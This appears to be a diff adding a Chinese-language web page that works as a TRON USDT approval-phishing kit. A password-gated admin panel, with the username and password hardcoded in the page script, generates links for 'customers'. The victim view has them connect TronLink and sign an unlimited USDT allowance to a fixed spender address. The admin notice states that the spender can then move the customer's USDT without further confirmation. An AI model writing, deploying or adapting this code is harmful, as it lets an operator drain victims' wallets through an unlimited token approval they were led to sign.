@@ -1,0 +1,188 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>USDT 授权 - TRON</title>
+<style>
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  body { font-family: -apple-system, "PingFang SC", Arial, sans-serif; margin: 0; padding: 16px; background: #0f1115; color: #e6e8eb; font-size: 16px; }
+  .card { background: #181b22; border-radius: 14px; padding: 16px; margin-bottom: 14px; }
+  h2 { margin: 0 0 12px; font-size: 18px; }
+  label { display: block; font-size: 13px; color: #9aa4b2; margin: 10px 0 4px; }
+  input { width: 100%; padding: 13px; background: #0f1115; color: #fff; border: 1px solid #2a2f3a; border-radius: 10px; font-size: 16px; outline: none; }
+  input:focus { border-color: #3b82f6; }
+  button { width: 100%; padding: 14px; background: #3b82f6; color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; margin-top: 12px; }
+  button:active { opacity: .8; }
+  button.ghost { background: #2a2f3a; }
+  .muted { color: #9aa4b2; font-size: 13px; word-break: break-all; margin-top: 8px; }
+  .ok { color: #34d399; }
+  .err { color: #f87171; }
+  .hidden { display: none; }
+  .notice { background: #2a1f0f; border: 1px solid #fbbf24; border-radius: 10px; padding: 12px; margin-top: 12px; font-size: 13px; color: #fbbf24; }
+  a { color: #60a5fa; }
+</style>
+</head>
+<body>
+
+<div id="adminView">
+  <div class="card">
+    <h2>后台登录</h2>
+    <label>账号</label>
+    <input id="u" value="zhaolong123" />
+    <label>密码</label>
+    <input id="p" type="password" />
+    <button onclick="login()">登录</button>
+    <div id="loginMsg" class="muted"></div>
+  </div>
+
+  <div id="adminPanel" class="hidden">
+    <div class="card">
+      <h2>生成授权链接</h2>
+      <p class="muted">USDT 合约：TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</p>
+      <p class="muted">spender：TNXUqdAEfywscfsG13o4EdvhpXmLNso1kA</p>
+      <p class="muted">授权数量：无限</p>
+      <button onclick="genLink()">生成授权链接</button>
+      <div id="linkOut" class="muted"></div>
+      <div class="notice">客户授权后，spender 地址可划走客户授权额度内的 USDT，无需客户再次确认。</div>
+    </div>
+    <div class="card">
+      <button class="ghost" onclick="logout()">退出登录</button>
+    </div>
+  </div>
+</div>
+
+<div id="authView" class="hidden">
+  <div class="card">
+    <h2>USDT 授权（TRON 主网）</h2>
+    <div class="muted">钱包：<span id="wallet">未连接</span></div>
+    <button onclick="connectWallet()">连接 TronLink</button>
+  </div>
+  <div class="card">
+    <label>USDT 合约</label>
+    <input id="aContract" readonly />
+    <label>被授权地址 spender</label>
+    <input id="aSpender" readonly />
+    <label>授权数量</label>
+    <input id="aAmount" readonly />
+    <button onclick="doApprove()">确认授权</button>
+    <div id="authMsg" class="muted"></div>
+    <div class="notice">授权后，spender 地址可在授权额度内划转你的 USDT。请确认地址无误后再签名。</div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
+<script>
+const ADMIN_USER = 'zhaolong123';
+const ADMIN_PASS = 'Aaqweewq1';
+
+const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+const SPENDER = 'TNXUqdAEfywscfsG13o4EdvhpXmLNso1kA';
+
+const params = new URLSearchParams(location.search);
+const mode = params.get('mode') || 'admin';
+
+if (mode === 'auth') {
+  document.getElementById('adminView').classList.add('hidden');
+  document.getElementById('authView').classList.remove('hidden');
+  document.getElementById('aContract').value = CONTRACT;
+  document.getElementById('aSpender').value = SPENDER;
+  document.getElementById('aAmount').value = '无限';
+} else {
+  if (localStorage.getItem('adminLogged') === '1') {
+    document.getElementById('adminPanel').classList.remove('hidden');
+  }
+}
+
+function login() {
+  const u = document.getElementById('u').value.trim();
+  const p = document.getElementById('p').value;
+  const msg = document.getElementById('loginMsg');
+  if (u === ADMIN_USER && p === ADMIN_PASS) {
+    localStorage.setItem('adminLogged', '1');
+    document.getElementById('adminPanel').classList.remove('hidden');
+    msg.textContent = '';
+    msg.className = 'muted';
+  } else {
+    msg.textContent = '账号或密码错误';
+    msg.className = 'muted err';
+  }
+}
+
+function logout() {
+  localStorage.removeItem('adminLogged');
+  location.reload();
+}
+
+function genLink() {
+  const base = location.origin + location.pathname;
+  const url = `${base}?mode=auth`;
+  const out = document.getElementById('linkOut');
+  out.innerHTML = `<a href="${url}" target="_blank">${url}</a>`;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(url).then(() => alert('已复制到剪贴板')).catch(() => {});
+  }
+}
+
+let tronWeb;
+
+async function connectWallet() {
+  if (!window.tronLink && !window.tronWeb) {
+    return alert('请用 TronLink App 内置浏览器打开此页');
+  }
+  try {
+    const tronLink = window.tronLink || window.tronWeb;
+    await tronLink.request({ method: 'tron_requestAccounts' });
+  } catch (e) {
+    return alert('TronLink 连接被拒绝');
+  }
+  tronWeb = window.tronWeb;
+  const addr = tronWeb.defaultAddress.base58;
+  const el = document.getElementById('wallet');
+  el.textContent = addr;
+  el.className = 'ok';
+}
+
+async function doApprove() {
+  const msg = document.getElementById('authMsg');
+  if (!tronWeb || !tronWeb.defaultAddress.base58) return alert('先连接 TronLink');
+
+  const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+  try {
+    const contract = await tronWeb.contract().at(CONTRACT);
+    const from = tronWeb.defaultAddress.base58;
+
+    const current = await contract.allowance(from, SPENDER).call();
+    if (BigInt(current.toString()) > 0n) {
+      msg.innerHTML = '当前已有授权，正在清零...';
+      const resetTx = await contract.approve(SPENDER, 0).send();
+      await waitForTx(resetTx);
+      msg.innerHTML = '已清零，正在设置新额度...';
+    }
+
+    const txId = await contract.approve(SPENDER, amount).send();
+    msg.innerHTML = '授权中，交易 ID：' + txId;
+    await waitForTx(txId);
+    msg.innerHTML = '<span class="ok">授权成功</span>';
+  } catch (e) {
+    msg.innerHTML = '<span class="err">授权失败：' + (e.message || e) + '</span>';
+  }
+}
+
+async function waitForTx(txId) {
+  for (let i = 0; i < 60; i++) {
+    const info = await tronWeb.trx.getTransactionInfo(txId);
+    if (info && info.id) {
+      if (info.receipt && info.receipt.result && info.receipt.result !== 'SUCCESS') {
+        throw new Error('交易失败：' + info.receipt.result);
+      }
+      return info;
+    }
+    await new Promise(r => setTimeout(r, 2000));
+  }
+  throw new Error('交易确认超时');
+}
+</script>
+</body>
+</html>
